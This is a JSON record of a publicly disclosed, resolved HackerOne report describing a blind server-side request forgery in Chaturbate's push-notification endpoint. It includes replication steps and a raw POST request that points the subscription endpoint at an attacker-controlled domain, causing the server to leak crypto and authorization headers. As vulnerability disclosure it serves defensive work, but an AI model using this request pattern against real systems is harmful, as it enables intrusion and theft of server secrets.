@@ -1,0 +1,125 @@
+{
+  "id": 411865,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTE4NjU=",
+  "url": "https://hackerone.com/reports/411865",
+  "title": "Blind SSRF at https://chaturbate.com/notifications/update_push/",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-20T17:04:29.167Z",
+  "submitted_at": "2018-09-20T17:04:29.167Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "robin0oklay",
+    "url": "/robin0oklay",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/222/555/832d60f882d9cd040105338c56b639f81ce8bb8f_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 30475,
+    "url": "https://hackerone.com/chaturbate",
+    "handle": "chaturbate",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Chaturbate",
+      "twitter_handle": "chaturbate",
+      "website": "https://chaturbate.com",
+      "about": "The largest online adult cam site"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-10-21T05:11:44.913Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-09-21T05:11:38.932Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "In the application at https://chaturbate.com/notifications/update_push/ there is a functionality to subscribe any cam model which will trigger the provided request. Using this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server\n\nSteps to Replicate the submission:-\n\nLogin to your https://chaturbate.com/ account or use my account-\nUSERNAME-██████████\nPASSWORD-███████\n\nNow click on profile, or trigger any request so that you can get your Cookie / CSRF token.\n\nSend any request to repeater and replace it with the provided request\n\nPOST /notifications/update_push/ HTTP/1.1\nHost: chaturbate.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nReferer: https://chaturbate.com/princesscin/\nContent-Type: application/x-www-form-urlencoded\nX-CSRFToken: YOURCSRFHERE\nX-Requested-With: XMLHttpRequest\nContent-Length: 408\nCookie: YOURCOOKIEHERE\nConnection: close\n\nsubscription={\"endpoint\":\"http:\\/\\/███\\/wpush\\/v2\\/████&unsub=false\n\nAs you can see that I have changed the actual URL to my domain ████████, so that I can get the actual request send to the server.\n\nPut your cookie and CSRF token (you can copy CSRF token from your cookies) over here and than send this request\n\nGo to this URL to confirm SSRF at - http://████████████\nyou will find that your Crypto-Key, Encryption header and Authorization Header is getting leaked onto the Attackers malicious site.\nThese headers are very sensitive to be leaked and hence needs to be fixed as soon as possible.\n\n##Note\nThe application do not require to send the URL along with the domain, it is secure to only send the Rest part of the URL and do not include the domain so that the attacker could not control the complete request.\n\nThanks\n\nRegards\nRobin Ooklay\n\n## Impact\n\nUsing this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-10-21T05:11:39.143Z",
+  "allow_singular_disclosure_after": -238241509.09238935,
+  "singular_disclosure_allowed": true,
+  "vote_count": 54,
+  "voters": [
+    "smither",
+    "ganeshbagaria",
+    "bogdantc",
+    "ali",
+    "sameerphad72",
+    "spam404",
+    "thalaivar304",
+    "logicmap",
+    "mik317",
+    "skavans",
+    "and 44 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 11722,
+    "asset_type": "URL",
+    "asset_identifier": "chaturbate.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
